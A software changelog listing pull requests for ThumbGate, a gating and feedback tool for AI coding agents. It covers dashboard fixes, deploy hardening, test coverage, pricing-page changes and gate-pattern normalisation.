- [#2191](https://github.com/IgorGanapolsky/ThumbGate/pull/2191) [`7ae4a15`](https://github.com/IgorGanapolsky/ThumbGate/commit/7ae4a158bc42d02c136af23ef2071682bed0cdd6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(context): implement Context Architecture (structured layers, proactive governance, TS routing)

- [#2138](https://github.com/IgorGanapolsky/ThumbGate/pull/2138) [`b6cbd47`](https://github.com/IgorGanapolsky/ThumbGate/commit/b6cbd476f4576fd6a4d7ea4a8daaef0542665258) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - `thumbgate help` (and bare `thumbgate`) now shows a curated 8-command short surface — `init`, `capture`, `stats`, `lessons`, `explore`, `dashboard`, `doctor`, `pro` — instead of dumping ~70 subcommands, internal hooks, "Also available" specialists, global flags, every `explore` sub-mode, and 18 example invocations the moment a first-time user types it.

  The full surface is still discoverable via `thumbgate help all` (also `--all` / `--full`), unchanged from before.

  Test coverage rewritten: `tests/cli.test.js` now asserts the short surface in the default path and the full surface behind `help all`, with a negative assertion that deep-niche commands (`proactive-agent-eval-guardrails`, `repair-github-marketplace`, etc.) stay out of the default view.

  Surfaced by a real customer screenshot on 2026-05-18: the default output was getting truncated at the terminal's right margin and reading as noise.

- [#2242](https://github.com/IgorGanapolsky/ThumbGate/pull/2242) [`4a0a3bb`](https://github.com/IgorGanapolsky/ThumbGate/commit/4a0a3bb0e100e8e5e4b6c825afbf15a8534356e6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix Operations Dashboard stat-card filters so clicking Positive/Negative/Total navigates to the Lessons Timeline tab pre-filtered to that signal (previously all three cards landed on the Rules tab unfiltered — the dashboard emitted `?signal=positive|negative` but `lessons.html` never parsed the query param).

  Two changes:

  1. **`public/dashboard.html`** — switch stat-card hrefs to the canonical `up|down|all` vocabulary the rest of the codebase uses (was `positive|negative`).
  2. **`public/lessons.html`** — read `?signal` at bootstrap, accept both canonical (`up|down|all`) and legacy (`positive|negative`) aliases, call `switchTab('timeline') + filterTimeline(mapped)` before falling through to the default Rules tab.

  Adds a Playwright E2E suite (`tests/e2e/dashboard-stat-cards.spec.js`) and a sharded GitHub Actions workflow (`.github/workflows/e2e.yml`) so this regression class is caught in CI on any future change to `public/`, `src/api/`, or the test infrastructure itself.

- [#2183](https://github.com/IgorGanapolsky/ThumbGate/pull/2183) [`fe6d564`](https://github.com/IgorGanapolsky/ThumbGate/commit/fe6d56437bd70eda83381b1fb6b0950ae69cb040) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix the broken "90-second demo" link from the README + tiny repo cleanup.

  **Problem:** `README.md` line 39 advertises `[▶ Watch the 90-second demo](https://thumbgate-production.up.railway.app/#demo?...)`. The home page had no element with `id="demo"`, so browsers landed at the top of the home page instead of jumping to the demo section. The README link looked broken to anyone reading it on GitHub.

  **Fix:**

  1. Add `id="demo"` to the "See It In Action" section on the home page (preserves the existing `id="social-proof"` anchor via a sibling `<a>` so nothing else breaks).
  2. Add a visible **▶ Watch the 90-second demo** button in the hero `.hero-actions` block pointing at `#demo`, with PostHog + first-party telemetry on click. This gives on-page visitors the same affordance the README has promised.

  **Tiny cleanup:**

  - `DISTRIBUTION_RUNBOOK.md` → `docs/DISTRIBUTION_RUNBOOK.md` (0 inbound references)
  - `RAILWAY_BILLING_SETUP.md` → `docs/ops/RAILWAY_BILLING_SETUP.md` (0 inbound references)

  Files with active inbound references (`LAUNCH.md`, `LAUNCH_NOW.md`, `LAUNCH_POSTS.md`, `FIRST_CUSTOMER_BATTLE_PLAN.md`, `MOAT.md`, `SKILL.md`, `primer.md`, `WORKFLOW.md`, `gate-program.md`) intentionally stay at root for this PR — moving them would require touching pinned test paths and is deferred.

- [#2260](https://github.com/IgorGanapolsky/ThumbGate/pull/2260) [`a34e7a6`](https://github.com/IgorGanapolsky/ThumbGate/commit/a34e7a621e5cd926942755a0e6cc313e789232e4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden the Railway deploy pipeline against the failure mode that took prod down on 2026-05-20 ("Stopping Container" right after healthcheck passes; cascading retry exhaustion on a single replica). Four targeted changes:

  **1. `railway.json` — give cold start room + tolerate transient failures + keep old container alive during swap**

  - `healthcheckTimeout`: 30 → 300 (per-deploy grace; better-sqlite3 native load + Node boot routinely exceeds 30s)
  - `restartPolicyMaxRetries`: 3 → 10 (3 healthcheck flaps was a hair-trigger for full service stop)
  - Added `overlapSeconds: 30` (Railway keeps the old container serving traffic for 30s after the new one is healthy, eliminating the gap window that caused today's HTTP 502)

  **2. `Dockerfile` HEALTHCHECK — align with actual startup time**

  - `--start-period=10s --retries=3` → `--start-period=60s --retries=5`
  - 10 seconds was below the observed cold-start of ~15-30s; healthcheck failed before the app was ready, marked unhealthy, killed.

  **3. `.github/workflows/deploy-railway.yml` — queue deploys, don't guillotine them**

  - `cancel-in-progress: true` → `cancel-in-progress: false`
  - Today's cascade: 4a0a3bb0 push → deploy starts → f52ef0b6 push 17 min later cancels it mid-flight → 51f545cc push 4 sec after that cancels f52ef0b6 mid-flight. Net result: 3 deploys started, 0 completed cleanly, prod stuck between containers.

  **4. `src/api/server.js` — graceful SIGTERM handler**

  - Without a handler, Node exits immediately on SIGTERM; Railway may flag the container as crashed (vs gracefully stopped), wasting restart-budget on healthy shutdowns and dropping in-flight requests.
  - Now drains HTTP connections for up to 25s before force-exit. Logs shutdown phase for debuggability.

  Background sources:

  - Railway docs: [Deployment Teardown](https://docs.railway.com/deployments/deployment-teardown), [Healthchecks](https://docs.railway.com/reference/healthchecks)
  - Railway community: [Container terminates after healthcheck](https://station.railway.com/questions/container-terminates-after-successful-he-67400aaf), [SIGTERM after 60-65s](https://station.railway.com/questions/container-sigterm-after-60-65-seconds-de-1e20ea2f)
  - Today's incident report: [Railway GCP suspension May 19 2026](https://blog.railway.com/p/incident-report-may-19-2026-gcp-account-outage)

  Not included (separate follow-up PRs):

  - Migrate Dockerfile base to `node:20-bookworm-slim` (drops the `python3 make g++` toolchain crutch + gets prebuilt better-sqlite3 binaries; ~50% build time cut). Higher-leverage but bigger blast radius.
  - Move to build-once-in-CI + push-to-GHCR + Railway image-auto-update. Eliminates `railway up` rebuild flakiness entirely.

- [#2266](https://github.com/IgorGanapolsky/ThumbGate/pull/2266) [`51cd62c`](https://github.com/IgorGanapolsky/ThumbGate/commit/51cd62c91a3ff659207dec1b75e7509fe9074679) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Migrates the Docker base image from `node:20-alpine` to `node:22-bookworm-slim`
  for both the builder and runtime stages.

  **Why:** `better-sqlite3@12.10.0` does not ship a prebuilt binary for the Node 20
  ABI (v115). On the previous Alpine image that meant `prebuild-install` always
  fell back to `node-gyp rebuild`, which required `python3 + make + g++` to be
  installed at build time. That toolchain added build minutes, image surface
  area, and one more thing to keep patched. The upstream WiseLibs prebuild
  matrix DOES include `node-v127-linux-x64` (Node 22), so moving the base to
  Node 22 lets `prebuild-install` resolve a ready-made `better_sqlite3.node`
  and skip the native compile entirely.

  **What changed:**

  - Builder + runtime: `node:20-alpine` → `node:22-bookworm-slim`
  - Removed `apk add --no-cache python3 make g++` from the builder stage
  - Swapped `apk add --no-cache git` for `apt-get install -y --no-install-recommends git wget` (wget is required by the existing HEALTHCHECK and is not preinstalled on bookworm-slim)
  - Swapped `addgroup -S / adduser -S` for the Debian-equivalent `groupadd -r / useradd -r`
  - Kept HEALTHCHECK timing, USER, EXPOSE, CMD, and the entire COPY layout identical

  **Verification (local, linux/amd64):**

  - `docker build` succeeds in ~61s (vs ~122s for the previous Alpine image, a ~2x speedup on a cold build)
  - `better_sqlite3.node` is present at `node_modules/better-sqlite3/build/Release/` and dated to upstream's release, confirming a prebuild download rather than a local compile
  - In-container `require('better-sqlite3')(':memory:')` round-trips a row correctly
  - Container starts and `/health` returns the expected JSON payload

  **Image size delta:** 511 MB → 564 MB (+53 MB). Acceptable trade-off given the
  build-time win, removal of the build-toolchain attack surface, and the
  reliability win of staying on prebuilt binaries.

- [#2249](https://github.com/IgorGanapolsky/ThumbGate/pull/2249) [`ba8fc02`](https://github.com/IgorGanapolsky/ThumbGate/commit/ba8fc023b4e3eaf2c176d768df58bb5056ec1583) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix Railway production deploys that have been failing since the better-sqlite3@12.10.0 bump. The Dockerfile's `node:20-alpine` builder stage was missing Python and a C++ toolchain, so when better-sqlite3's prebuilt musl binary wasn't found, the `node-gyp rebuild` fallback failed with `Could not find any Python installation to use`. Every Railway deploy since the bump has built green in GitHub Actions, sent `railway up` successfully, then failed inside Railway's Docker build — and Railway's restart policy kept serving the old container (buildSha `92f8e4b1`, version 1.20.0) for hours.

  Added `RUN apk add --no-cache python3 make g++` to the builder stage. Runtime stage stays slim (Python isn't needed at runtime, only at install).

- [#2141](https://github.com/IgorGanapolsky/ThumbGate/pull/2141) [`e5084f2`](https://github.com/IgorGanapolsky/ThumbGate/commit/e5084f221bd8e407558be9e28c554bc009f67a51) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Docs: document the machine-wide vs per-project install scope choice.

  ThumbGate has shipped two install scopes since v1.x — `npx thumbgate init` (machine-wide, default, writes to `~/.claude/settings.json`, one shared lesson DB and dashboard across every repo) and `npx thumbgate init --project` (per-repo, writes to `<repo>/.claude/settings.json`, separate lesson DB per repo). Until now, neither scope was documented on any user-facing surface — not the README, not thumbgate.ai, not the guide page, not the CLI help. Users had no way to make an informed choice.

  This change adds:

  - A dedicated "Install scope: machine-wide vs per-project" section to the README under "Install for Your Agent"
  - The same comparison table to `public/guide.html` (rendered on thumbgate.ai/guide.html)
  - An expanded `install-mcp` help line in `bin/cli.js` that documents both scopes, the default, and the `--no-hooks` opt-out from the install-mcp + hooks unification PR
  - A regression test suite (`tests/install-scope-docs.test.js`, 9 tests) pinning the scope docs in README, guide.html, and CLI help so they cannot silently disappear

  No code behavior changes — pure docs + CLI help text + regression test.

- [#2272](https://github.com/IgorGanapolsky/ThumbGate/pull/2272) [`f3a99b7`](https://github.com/IgorGanapolsky/ThumbGate/commit/f3a99b75639c85d264eb5f95de745938bc19ba5a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - **E2E coverage expansion for the conversion funnel.** PR [#2268](https://github.com/IgorGanapolsky/ThumbGate/issues/2268) added comprehensive clickability coverage for `/lessons`, but the four highest-priority public pages a real visitor traverses on the way to revenue still had zero Playwright clickability assertions. CEO directive: "100% e2e verification."

  Four new Playwright specs at `tests/e2e/<page>-clickability.spec.js`, each enumerating every deterministic clickable surface on its page and asserting a visible effect (URL change, content swap, accordion toggle, copy-hint flip, scroll-into-view) per click — never just "handler fired."

  Per-page test counts:

  - `/` (landing) — 19 tests (hero copy/CTAs, in-page nav anchors, FAQ accordion, pricing section CTAs, sticky bottom CTA)
  - `/dashboard` — 21 tests (auth bar + Connect, Try Demo, 8 tab headers, 4 source filters, Mark Reviewed, DPO export, nav)
  - `/agent-manager` — 11 tests (5 nav links, 2 primary CTAs, 3 related-reading links, render check)
  - `/pricing` — 18 tests (5 nav links, 3 plan CTAs, scope-first link, 5-item FAQ accordion, 5 footer links)

  Total: **69 new tests**, none duplicating the four stat cards already covered by `tests/e2e/dashboard-stat-cards.spec.js`.

  Three of the `/` landing-page tests **intentionally fail** because they expose a real bug: `toggleFaq` and `handleFaqKeydown` in `public/index.html` are defined inside an IIFE, so the inline `onclick="toggleFaq(this)"` attributes throw `ReferenceError` and the entire FAQ accordion is dead. This PR does not fix the page bug — it surfaces it with a failing test so a follow-up can hoist the handlers to the window scope. The other 66 tests pass.

  npm scripts added: `test:index-page-clickability`, `test:dashboard-page-clickability`, `test:agent-manager-page-clickability`, `test:pricing-page-clickability`.

- [#2095](https://github.com/IgorGanapolsky/ThumbGate/pull/2095) [`2770a63`](https://github.com/IgorGanapolsky/ThumbGate/commit/2770a63b2351ad14d96bc8a0c91dc55b8a7eb55c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `scripts/external-customer-audit.js` — Stripe truth filtered by owner email.

  Background: The unified revenue rollup ([#2090](https://github.com/IgorGanapolsky/ThumbGate/issues/2090)) shipped raw Stripe totals: lifetime net, MRR, active subscription count. Those numbers count the operator's own purchases and subscriptions as if they were external customers. On a small operator-run product that's a meaningful confound — the difference between "1 active subscription" and "0 real customers" is whether the operator subscribed to test billing.

  This script splits Stripe activity into `owner` vs `external` buckets and reports external-only counts as the headline number. Owner emails come from `THUMBGATE_OWNER_EMAILS` (comma-separated env var) with a default of `iganapolsky@gmail.com,igor.ganapolsky@gmail.com`. Wired into the Daily Revenue Loop workflow as a separate step alongside the unified rollup; outputs `reports/revenue/external-audit.{md,json}` plus a GitHub job-summary section.

  The script's headline always reports three external-only numbers explicitly so they cannot be confused with owner-inclusive totals:

  - Real, non-owner paying customers lifetime
  - Real, non-owner net revenue lifetime
  - Real, non-owner active subscriptions (+ MRR)

  11 unit tests with an injected fake Stripe client cover: missing-secret gap, owner/external partitioning by email match, case-insensitivity, refunded-charge exclusion, billing_details fallback when customer object has no email, subscription MRR split, checkout completion split, and the headline markdown rendering.

- [#2276](https://github.com/IgorGanapolsky/ThumbGate/pull/2276) [`5cda284`](https://github.com/IgorGanapolsky/ThumbGate/commit/5cda284d7dfab2aa835896a73f20b94020145a9c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(dashboard): Active Gates stat-card click now activates the Gates tab + scrolls it into view

  Clicking the Active Gates card on /dashboard previously appeared to do nothing.
  Two bugs in switchTab():

  1. The selector `document.querySelector('[onclick*="<name>"]')` matched the
     stat-card (first in DOM order) instead of the tab header for that name,
     so the tab header never lit up as active.
  2. The tab content panel did get .active, but it sat below the fold; with
     no scrollIntoView, the user perceived "nothing happened" because the
     newly-visible content was off-screen.

  Fix: scope the header selector to `.tab`, and call
  `contentEl.scrollIntoView({ behavior: 'smooth', block: 'start' })` after
  activating the panel. Regression pinned by two new tests in
  tests/e2e/dashboard-stat-cards.spec.js.

- [#2135](https://github.com/IgorGanapolsky/ThumbGate/pull/2135) [`b452526`](https://github.com/IgorGanapolsky/ThumbGate/commit/b452526e7f3848a6894f17329ee85127bf6a3e3d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix four install-flow bugs surfaced during a real customer walkthrough on 2026-05-18:

  1. **`npx thumbgate pro` (no args) silently falls back to the info banner for creator-dev users** — the dashboard-launch predicate `if (resolvedKey && resolvedKey.key)` rejected the legitimate `{key:'', source:'creator-dev', plan:'enterprise'}` shape that `resolveProKey()` returns when `THUMBGATE_DEV_KEY` is unset. Predicate now also accepts `source === 'creator-dev'`, matching what `startLocalProDashboard` already supports.

  2. **`init` silently deletes user-authored hooks whose command contains a shell variable.** `pruneStaleFileHooks` was treating `"$CLAUDE_PROJECT_DIR"/.claude/hooks/x.sh` as a literal filesystem path, so `fs.existsSync` returned false and the hook was removed with a misleading "Removed stale hook referencing missing file" warning even when the script existed. Added a bounded `$VAR` / `${VAR}` expander with quote stripping, and a fail-safe: if any `$` remains after expansion, skip pruning rather than risk destroying a valid hook.

  3. **`isProTier()` ignored creator-dev installs**, so commands that DO consult it (upgradeNudge, rate gates) still nagged the maintainer on their own machine. Added an `isCreatorDev()` check.

  4. **`proNudge` never consulted `isProTier` at all** — every `stats` / `lessons` / `summary` call printed the Pro upsell even for paid users. Now short-circuits on Pro tier (and transitively on creator-dev).

  README Quick Start showed the bare positional `npx thumbgate capture "text"` form which actually errors `Missing or unrecognized --feedback=up|down` — replaced with the working `--feedback= --context=` form. Same correction in the CLI Reference section.

  6 new regression tests in `tests/creator-dev-and-prune.test.js`. All 150 existing cli / hook / rate-limiter tests still pass.

- [#2115](https://github.com/IgorGanapolsky/ThumbGate/pull/2115) [`72fda40`](https://github.com/IgorGanapolsky/ThumbGate/commit/72fda40c8a693dd724cf3e8c3d59f43f680866bd) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Collapse the Pro buyer path to one Stripe CTA plus intake fallback by removing unrelated service payment links from `/pro` and the checkout interstitial, and add a revenue observability doctor that fails closed when revenue or visitor proof access is missing.

- [#2179](https://github.com/IgorGanapolsky/ThumbGate/pull/2179) [`97e27f1`](https://github.com/IgorGanapolsky/ThumbGate/commit/97e27f12ef5e16b71932869f2fa3c50217e1e388) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Collapse the public Team funnel to intake-first and position ThumbGate against persistent agent skills with enforcement proof.

- [#2115](https://github.com/IgorGanapolsky/ThumbGate/pull/2115) [`72fda40`](https://github.com/IgorGanapolsky/ThumbGate/commit/72fda40c8a693dd724cf3e8c3d59f43f680866bd) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Funnel collapse on `/`. The workflow-sprint section (paid consulting: $97 kit, $499 diagnostic, $1500 sprint, $3997 setup, $297/mo retainer) is now wrapped in a `<details>` element collapsed by default. A cold visitor scrolling the landing page sees only the three coherent SaaS tiers (Free $0, Pro $19/mo, Team $49/seat/mo) instead of 11 competing price points.

  Verified counts:

  - Before: 11 distinct price points visible on default scroll
  - After: 6 visible (`$0`, `$19`, `$19/mo`, `$49`, `$49/seat/mo`, `$147/mo`) — all SaaS tier prices, no mixed signals
  - Consulting prices still present, one click away, no revenue surface lost

  Addresses the 2026-05-18 strict assessment finding: "Eleven distinct price points on one page, with three separate purchase paths. A cold buyer cannot tell what to buy. This is the biggest single problem."

  Zero changes to: server routes, Stripe links, telemetry hooks, anchor IDs (`#workflow-sprint-intake` still resolves), form submission flow. Pure HTML restructure.

- [#2112](https://github.com/IgorGanapolsky/ThumbGate/pull/2112) [`5441efe`](https://github.com/IgorGanapolsky/ThumbGate/commit/5441efece070396266dd2d1771c6ead9707cad87) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Gate pattern keys now collapse trivial command variants. Previously, `rm -rf node_modules`, `rm -rf ./node_modules`, and `rm -rf "node_modules"` produced three separate gate IDs — accidental dislikes proliferated and one captured failure didn't catch its near-twins on the next run.

  Addresses the r/ClaudeCode critique (MomSausageandPeppers, 2026-05-17): "commands are matched by string equality, so trivial variations create separate gates."

  New helper `normalizeCommandSignature(input)` (exported from `scripts/auto-promote-gates.js`) applies a conservative set of transforms:

  - lowercase
  - strip `/Users/<name>/` and `/home/<name>/` home-dir prefixes (→ `~`)
  - drop `:LINE` and `:LINE:COL` refs
  - per-token: strip one layer of matching outer quotes/backticks
  - per-token: drop leading `./`
  - collapse whitespace + trim

  Explicitly does **not** reorder flags, collapse `&&` chains, or canonicalize subcommands — each of those can change semantics. Regression tests pin both behaviors (`does NOT reorder flags`, `does NOT collapse && chains`).

  `extractPatternKey()` now routes context through `normalizeCommandSignature` so five common rm-rf variants collapse to one gate ID. Tag-based keys still take precedence when tags are present.

  12 new tests in `tests/auto-promote-gates.test.js`; 31/31 in file passing.

- [#2078](https://github.com/IgorGanapolsky/ThumbGate/pull/2078) [`1f01c75`](https://github.com/IgorGanapolsky/ThumbGate/commit/1f01c75731a89229fbd4c93f9fbc8e1181174378) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - chore(landing): flip the hero CTA on `public/index.html` from "Get Pro — $19/mo" to "Talk to me — Workflow Hardening Sprint →" pointing at the existing `#workflow-sprint-intake` anchor. Pro/Team tiers below the fold are untouched and still convert via `/checkout/pro`. Aligns the highest-traffic landing surface with the actual buyer ICP (platform / devex leaders who buy fixed-scope engagements, not $19/mo self-serve).

  Adds `docs/marketing/buyer-list-real-humans-2026-05-14.md`, `docs/marketing/buyer-list-send-ready-2026-05-14.md`, `docs/marketing/bluesky-quote-tns-2026-05-14.md` — outreach drafts, not runtime files.

- [#2253](https://github.com/IgorGanapolsky/ThumbGate/pull/2253) [`a49ac2f`](https://github.com/IgorGanapolsky/ThumbGate/commit/a49ac2fdc7383c72d83b543e7e45fa448a631db1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add regression test for a previously-shipped class of bug where ThumbGate's hook command builders dropped the subcommand on the fast path (`exec "$BIN"` instead of `exec "$BIN" "<subcommand>"`). When the runtime binary existed (always, after first install), Claude Code would exec bare `thumbgate`, which prints the help screen — that help became users' statusline; the gate-check/cache-update/session-start/hook-auto-capture hooks became silent no-ops; and re-running `thumbgate init` would silently reinstall the broken settings.

  The bug is already fixed in current source (`scripts/published-cli.js` correctly includes `${escapedArgs ? \` ${escapedArgs}\` : ''}` on both branches). These tests lock the behavior in:

  - `tests/published-cli.test.js` — three new tests asserting the fast-path _independently_ contains the subcommand, that every hook subcommand appears exactly twice (once per branch), and that `preferInstalled=false` keeps the subcommand on its exec line.
  - `tests/hook-runtime-subcommands.test.js` (new) — higher-level guard over `statuslineCommand`, `preToolHookCommand`, `userPromptHookCommand`, `sessionStartHookCommand`, `cacheUpdateHookCommand`. Asserts each result contains its subcommand AND never matches the `exec PATH` pattern without a subcommand argument.

  Together these prevent future refactors of `resolveCliCommand` from re-introducing the bug class even on new branches (Volta shim, source checkout, additional builders).

- [#2252](https://github.com/IgorGanapolsky/ThumbGate/pull/2252) [`2a88b24`](https://github.com/IgorGanapolsky/ThumbGate/commit/2a88b2450c31fce70a33938eb6c2eedb9a530feb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add mandatory implementation notes system: `.claude/implementation-notes/` directory for per-task decision logs, new CLAUDE.md section mandating their use, and new hard-won lesson from the 2026-05-20 deploy root-cause misdiagnosis. Adopted from @trq212's prompting pattern for keeping the CEO in the loop on decisions, tradeoffs, and corrections during multi-step tasks.

- [#2234](https://github.com/IgorGanapolsky/ThumbGate/pull/2234) [`e00b400`](https://github.com/IgorGanapolsky/ThumbGate/commit/e00b4000d04e9da72ebb1bbd9a6f34155e007a25) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix `thumbgate init` to auto-detect and wire Claude Code.

  The platform-detection loop in `init` listed Codex, Gemini, Amp, Cursor, ForgeCode and Cline but had no Claude Code entry — so running `thumbgate init` inside Claude Code silently skipped the flagship agent, printing no status and wiring no hooks unless `--agent claude-code` was passed explicitly.

  `init` now detects Claude Code (`which claude` / `~/.claude`) and wires it through the shared `wireHooks` path like every other agent. `setupClaude()` (used by `thumbgate install`) now delegates gate-hook wiring to that same path, so `init`, `init --agent claude-code`, and `install` all produce the identical hook set — including the PreToolUse pre-action gate, which `install` previously omitted entirely. `thumbgate --version` / `-v` now prints the package version instead of `Unknown command`.

- [#2143](https://github.com/IgorGanapolsky/ThumbGate/pull/2143) [`60c421a`](https://github.com/IgorGanapolsky/ThumbGate/commit/60c421ad1f11b96b96b5515dc750bcb4d888d460) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Removes the "82% token savings" specific claim from the landing-page feature list. The 82% figure comes from a generic per-skill formula in `scripts/skill-packs.js` (`Math.round((1 - l1Chars/totalChars) * 100)`) — the actual savings vary per skill pack. No benchmark file substantiates 82% as an aggregate or median, so the specific number was an unverifiable trust signal.

  Replaced with a mechanism description that points readers to the metric source:

  > "Progressive Disclosure — 3-tier L1/L2/L3 loading cuts skill-pack token cost per the disclosureSavings metric in scripts/skill-packs.js"

  Same class of fix as PR [#2137](https://github.com/IgorGanapolsky/ThumbGate/issues/2137) (false `/checkout/pro` claims). Adheres to the CLAUDE.md Honesty Protocol: code-shipped ≠ outcome-achieved; verifiable numbers only on buyer-facing surfaces.

- [#2113](https://github.com/IgorGanapolsky/ThumbGate/pull/2113) [`97a59e4`](https://github.com/IgorGanapolsky/ThumbGate/commit/97a59e42569240fbabce75170fe99ee4c48aad30) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - New article: `/learn/agent-swarms-shared-gates` — explains why multi-agent swarms pay N&times; the token cost on every repeated mistake without shared safety memory, and how a single MCP gate layer makes Opus, GPT, and Gemini fail the same way only once.

  Captures real search intent ("agent swarm token cost", "multi-agent shared memory", "agent swarm shared state") and grounds the claim in ThumbGate's actual architecture: one feedback dir, one PreToolUse hook, model-agnostic pattern matching, JSONL append-only feedback log that handles concurrent captures from multiple agents.

  Honest framing: explicitly states what a shared gate layer does NOT solve (work routing, model selection, load balancing — that's the swarm framework's job). Linked from the learn index.

- [#2148](https://github.com/IgorGanapolsky/ThumbGate/pull/2148) [`c353b56`](https://github.com/IgorGanapolsky/ThumbGate/commit/c353b56650574fbfd71bf5705d8dc6a9652d237e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - New article: `/learn/claude-code-goal-with-rubrics` — connects Min Choi's [viral /goal pattern tweet](https://x.com/minchoi/status/2054763842521960728) (Claude Code's `/goal` command is way more powerful when you stop treating it like a todo: clear goal, measurable success, shown proof, hard limits) to ThumbGate's existing `scripts/rubric-engine.js`.

  The 4-field pattern Min Choi posted is exactly the shape ThumbGate's rubric-engine already enforces at gate-fire time. The article shows the mapping:

  - Clear goal → `rubric.goal`
  - Measurable success → `rubric.verification.check`
  - Shown proof → `rubric.verification.evidence`
  - Hard limits → `rubric.budget` (tied to `budget-guard.js`)

  Captures real search intent for "claude code /goal command", "verifiable AI agent outcomes", "agent rubric pattern". Linked from `/learn` index card.

- [#2268](https://github.com/IgorGanapolsky/ThumbGate/pull/2268) [`54006eb`](https://github.com/IgorGanapolsky/ThumbGate/commit/54006eb54aa9f7ef3470fea9347f2d6c81fd2d7a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix /lessons stat-card clicks that appeared to do nothing — switchTab() now scrolls the active tab content into view so the user sees a visible response. Without scrollIntoView, clicking "Active Rules" / "Critical" / "Actions Blocked" / "Approval Trend" was a silent no-op from the user's POV: the handler fired and the tab class flipped, but the tab content was below the fold and the page never scrolled to it. CEO reported the bug; verified the silent-handler symptom by inspection.

  Also: 17 new Playwright E2E tests in `tests/e2e/lessons-page-clickability.spec.js` cover EVERY deterministic clickable surface on /lessons — 4 stat tiles, 3 tab headers, 4 rules filter buttons, 3 timeline filter buttons, 2 nav anchors, plus a render assertion. Each tile click test asserts the tab content is in-viewport after click (catches future scrollIntoView regressions). Closes the E2E coverage gap from PR [#2242](https://github.com/IgorGanapolsky/ThumbGate/issues/2242) (which only tested the dashboard stat cards, not the lessons-page tiles).

- [#2084](https://github.com/IgorGanapolsky/ThumbGate/pull/2084) [`62e7d65`](https://github.com/IgorGanapolsky/ThumbGate/commit/62e7d65803bb2d65ed2da174933b47922020988d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add top-level `Organization` JSON-LD block to the landing page so Google's TurboQuant entity index (and AI Overviews) can recognize ThumbGate as a distinct entity with founder, logo, and canonical `sameAs` profiles (GitHub repo, npm package, founder profile). Previously the only Organization markup was embedded as `provider` inside the Workflow Sprint Service block — embedded providers are less reliable entity signals than a standalone Organization node.

  Conservative `sameAs` — only verified, ThumbGate-owned URLs (no speculative social profile claims).

- [#2093](https://github.com/IgorGanapolsky/ThumbGate/pull/2093) [`1d4c76f`](https://github.com/IgorGanapolsky/ThumbGate/commit/1d4c76f5064e721946cdaf5c16473f1e7b8d0b7e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix `/pricing` contradiction: the previously shipped page collapsed two distinct products ("Sprint Diagnostic" $499 and "Workflow Hardening Sprint" $1500) into a single "$499 Sprint" card. Buyer arriving from the homepage hero — which correctly distinguishes "$499 diagnostic, $1500 sprint, $3,997 governance setup" — would see different numbers on adjacent pages.

  This rewrites `/pricing` as the single source of truth with all six paid paths visible:

  - **$1,500** Workflow Hardening Sprint (full engagement, hero card)
  - **$499** Sprint Diagnostic (proof-pack on-ramp)
  - **$0** Free CLI
  - **$19/mo · $149/yr** Pro
  - **$49/seat/mo** Team (3-seat min, $147/mo)
  - Micro-purchase row: $1 first failure rule, $19 quick read, $99 workflow teardown

  Each card has a direct Stripe Payment Link (or `/go/*` tracked-link router) so a buyer landing from any inbound channel can complete checkout in one click without leaving the pricing page.

- [#2116](https://github.com/IgorGanapolsky/ThumbGate/pull/2116) [`c6e3699`](https://github.com/IgorGanapolsky/ThumbGate/commit/c6e36991114599cddaf1771c989221f64e6deb51) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - `/pricing` rebuilt SaaS-first. The previous version led with the **$1,500 Workflow Hardening Sprint as the hero card** and demoted Pro/Team to `cta-secondary` styling — actively working against $19/mo self-serve conversion. A buyer who clicked "Pricing" in the nav landed on a consulting upsell.

  New structure:

  - Hero card (blue accent, "Most popular" badge): **Pro $19/mo** with primary CTA
  - Flanking cards: **Free CLI** ($0) and **Team** ($49/seat)
  - Consulting ($499 diagnostic / $1,500 sprint / $97 kit) collapsed into a `<details>` element below the grid

  Self-serve checkout on every paid plan — the lede now reads "Three tiers. Pick the one that matches your scale. Self-serve checkout on every paid plan — no calls" instead of "Six paths to ThumbGate. Pick by what you need."

  All 126 existing tests in `tests/api-server.test.js` still pass, including the `pricing page is the single source of truth` test that pins every tier name + price + CTA route. No revenue surface lost — the $499/$1,500/$97 paths still convert through the same mailto and Stripe Payment Link, just behind one click.

- [#2245](https://github.com/IgorGanapolsky/ThumbGate/pull/2245) [`ea7053f`](https://github.com/IgorGanapolsky/ThumbGate/commit/ea7053f75ef3a290fdd2274d7cddc2952bbecf72) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Improve Railway deploy reliability: fix deploy-scope false positive when BEFORE_SHA is unreachable in shallow clone, reduce health check window from 20 minutes to 6 minutes (matching Railway's 300s healthcheck timeout), simplify concurrency group, add explicit timeout to health verification step.

